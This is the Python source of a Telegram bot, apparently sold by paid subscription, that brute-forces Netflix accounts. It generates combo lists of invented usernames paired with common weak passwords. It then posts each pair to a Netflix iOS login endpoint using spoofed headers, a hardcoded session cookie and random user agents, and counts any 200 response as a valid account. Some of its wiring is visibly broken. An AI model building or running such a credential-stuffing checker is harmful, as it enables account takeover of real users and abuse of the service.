import telebot
import requests
import random
import os
import string
from telebot import types
from user_agent import generate_user_agent
from datetime import datetime, timedelta

# Your Token Here
TOKEN = 'YOUR_TOKEN'
bot = telebot.TeleBot(TOKEN)

# Admin ID
admin_id = "YOUR_ID"

users = {}
codes = {}

url = 'https://ios.prod.http1.netflix.com/iosui/user/10.19'
headers = {
    "Host": "ios.prod.http1.netflix.com",
    "Cookie": "flwssn=74266376-523d-48c3-9bc3-8a009e804a37; memclid=TkZBUFBMLTAyLUlQSE9ORTk9NC1ENUJBN0IxQTAyNTI0NTM2OEQ0QUEzMjNFOTg3NDMzQzUyQzZGQjRCNjczRTg1NjIxRUEzMDFENDQ0RUM3OEIx; nfvdid=BQFmAAEBENN4QjtTnSS8VW_4WDVPc45gbv8HGuY3dcUdp9_6Xb6d_vcJbqU4lp2n8cm8kaOYxAGr7OI5JciXNkgH-zvKmtkUQcWfMkOj3TvuMtezrkns7ZtQcfAcFOutfzGV9LhYM1QKbizWrz0uHkFoHMVbhNYl",
    "Content-Type": "application/x-www-form-urlencoded",
    "X-Netflix.argo.abtests": "",
    "X-Netflix.client.appversion": "10.19.0",
    "Accept": "*/*",
    "Accept-Encoding": "gzip, deflate",
    "Accept-Language": "ar-US;q=1, en-US;q=0.9",
    "Content-Length": "1851",
    "X-Netflix.client.idiom": "phone",
    "User-Agent": generate_user_agent(),
    "X-Netflix.client.type": "argo",
    "X-Netflix.nfnsm": "9",
    "Connection": "close"
}

stop_checking = False

def generate_code():
    return ''.join(random.choices(string.digits, k=12))

def is_code_valid(user_id):
    if user_id in users:
        subscription_end = users[user_id]['end_time']
        if datetime.now() < subscription_end:
            return True
    return False

@bot.message_handler(commands=['start'])
def start(message):
    user_id = str(message.from_user.id)
    if user_id == admin_id or is_code_valid(user_id):
        send_main_menu(message.chat.id)
    else:
        markup = types.InlineKeyboardMarkup()
        btn = types.InlineKeyboardButton('Add Code', callback_data='add_code')
        button_channel = types.InlineKeyboardButton("Developer Channel", url="https://t.me/method_shop")

        markup.add(btn)
        markup.add(button_channel)
        bot.send_message(message.chat.id, "Sorry, please contact the bot developer for a subscription.", reply_markup=markup)

def send_main_menu(chat_id):
    markup = types.InlineKeyboardMarkup()
    btn1 = types.InlineKeyboardButton('GIT LIST: Fetch List', callback_data='generate_list')
    btn2 = types.InlineKeyboardButton('CHECK LIST: Check the List', callback_data='check_list')
    btn3 = types.InlineKeyboardButton('DELETE LIST: Delete List', callback_data='delete_list')
    button_channel = types.InlineKeyboardButton("Developer Channel", url="https://t.me/method_shop")

    markup.add(btn1)
    markup.add(btn2)
    markup.add(btn3)
    markup.add(button_channel)
    bot.send_message(chat_id, "Choose an option:", reply_markup=markup)

@bot.message_handler(commands=['admin'])
def admin_panel(message):
    if str(message.from_user.id) == admin_id:
        markup = types.InlineKeyboardMarkup()
        btn1 = types.InlineKeyboardButton('Create Code', callback_data='create_code')
        btn2 = types.InlineKeyboardButton('Statistics', callback_data='statistics')
        btn3 = types.InlineKeyboardButton('Remove User Subscription', callback_data='remove_subscription')
        btn4 = types.InlineKeyboardButton('Broadcast', callback_data='broadcast_message')
        markup.add(btn1, btn3, btn4)
        markup.add(btn2)
        bot.send_message(message.chat.id, "Admin Panel:", reply_markup=markup)
    else:
        bot.send_message(message.chat.id, "You do not have permission to access this panel.")

@bot.callback_query_handler(func=lambda call: True)
def callback_query(call):
    if call.data == 'generate_list':
        generate_list(call.message)
    elif call.data == 'check_list':
        bot.send_message(call.message.chat.id, "Send your list for checking.")
    elif call.data == 'delete_list':
        delete_list(call.message.chat.id, "users.txt")
    elif call.data == 'create_code':
        bot.send_message(call.message.chat.id, "What is the code duration?\n\nh = Hour\nd = Day\nm = Month\ny = Year\n\nFor example: h 1")
        bot.register_next_step_handler(call.message, receive_duration)
    elif call.data == 'add_code':
        bot.send_message(call.message.chat.id, "Please enter the code.")
        bot.register_next_step_handler(call.message, verify_code)
    elif call.data == 'statistics':
        show_statistics(call.message)
    elif call.data == 'remove_subscription':
        bot.send_message(call.message.chat.id, "Enter the user ID to remove their subscription.")
        bot.register_next_step_handler(call.message, remove_subscription)
    elif call.data == 'broadcast_message':
        bot.send_message(call.message.chat.id, "Enter the message to broadcast to everyone.")
        bot.register_next_step_handler(call.message, broadcast_message)

def generate_list(message):
    filename = 'users.txt'
    names = ['Ada', 'Adriano', 'Afro', 'Agata', 'Alberto', 'Alessandra', 'Alessandro', 'Alessia', 'Alessio', 'Alfredo', 'Alice', 'Allegra', 'Alma', 'Amabel']
    digits = '1234567890'
    with open(filename, 'w') as file:
        for _ in range(2000):
            email1 = "".join(random.choice(names) for _ in range(1))
            email0 = "".join(random.choice(digits) for _ in range(3))
            email = email1 + email0
            passwords = [email, '1122334455', '12345678', '12345qwert', '11223344', '19901990', 'football', 'password']
            password = random.choice(passwords)
            file.write(f'{email}:{password}\n')
    with open(filename, 'rb') as file:
        bot.send_document(message.chat.id, file)

def delete_list(chat_id, file_path):
    global stop_checking
    stop_checking = True

    if os.path.exists(file_path):
        os.remove(file_path)
        bot.send_message(chat_id, "File deleted and checking stopped.")
    else:
        bot.send_message(chat_id, "No file found to delete, but checking has been stopped.")

def receive_duration(message):
    duration = message.text.strip()
    if len(duration.split()) == 2 and duration.split()[0] in ["h", "d", "m", "y"] and duration.split()[1].isdigit():
        unit, amount = duration.split()
        amount = int(amount)

        if unit == 'h':
            delta = timedelta(hours=amount)
        elif unit == 'd':
            delta = timedelta(days=amount)
        elif unit == 'm':
            delta = timedelta(days=30*amount)
        elif unit == 'y':
            delta = timedelta(days=365*amount)

        code = generate_code()
        codes[code] = datetime.now() + delta
        bot.send_message(message.chat.id, f"Code generated successfully: {code}")
    else:
        bot.send_message(message.chat.id, "Invalid format. Please try again.")

def verify_code(message):
    code = message.text.strip()
    user_id = str(message.from_user.id)
    if code in codes and datetime.now() < codes[code]:
        users[user_id] = {'end_time': codes[code]}
        del codes[code]
        bot.send_message(message.chat.id, "Subscription activated successfully.")
        send_main_menu(message.chat.id)
    else:
        bot.send_message(message.chat.id, "Invalid or expired code.")

def show_statistics(message):
    response = "Number of bot users:\n"
    count = 0
    for user_id, data in users.items():
        if 'end_time' in data:
            count += 1
            remaining = (data['end_time'] - datetime.now()).total_seconds() // 3600
            response += f"User: {user_id}, Subscription remaining: {remaining} hours\n"
    bot.send_message(message.chat.id, response + f"\nTotal: {count} users.")

def remove_subscription(message):
    user_id = message.text.strip()
    if user_id in users and 'end_time' in users[user_id]:
        del users[user_id]
        bot.send_message(message.chat.id, "User's subscription removed successfully.")
    else:
        bot.send_message(message.chat.id, "This user is not subscribed.")

def broadcast_message(message):
    text = message.text
    count = 0
    total_users = len(users)
    for user_id in users:
        if 'end_time' in users[user_id]:
            bot.send_message(user_id, text)
            count += 1
    bot.send_message(message.chat.id, f"Message sent to {count} users out of {total_users}.")

def check_list_from_file(file_path, chat_id):
    global stop_checking
    stop_checking = False
    try:
        with open(file_path, 'r') as file:
            lines = file.readlines()
            total_lines = len(lines)
            sent_message = bot.send_message(chat_id, "Checking accounts...")
            message_id = sent_message.message_id
            for checked_count, line in enumerate(lines, start=1):
                if stop_checking:
                    bot.send_message(chat_id, "Checking stopped.")
                    break
                email, password = line.strip().split(':')
                message_id = check_account(email, password, chat_id, message_id, total_lines, checked_count)
    except Exception as e:
        bot.send_message(chat_id, f"An error occurred: {str(e)}")

def check_account(email, password, chat_id, message_id, total_lines, checked_count):
    try:
        response = requests.post(url, data={"email": email, "password": password}, headers=headers)
        status = "Valid" if response.status_code == 200 else "Invalid"
        remaining_count = total_lines - checked_count
        bot.edit_message_text(f"Checking accounts... Remaining: {remaining_count} accounts", chat_id, message_id)
        return status
    except Exception as e:
        bot.send_message(chat_id, f"An error occurred during checking: {str(e)}")

bot.polling()
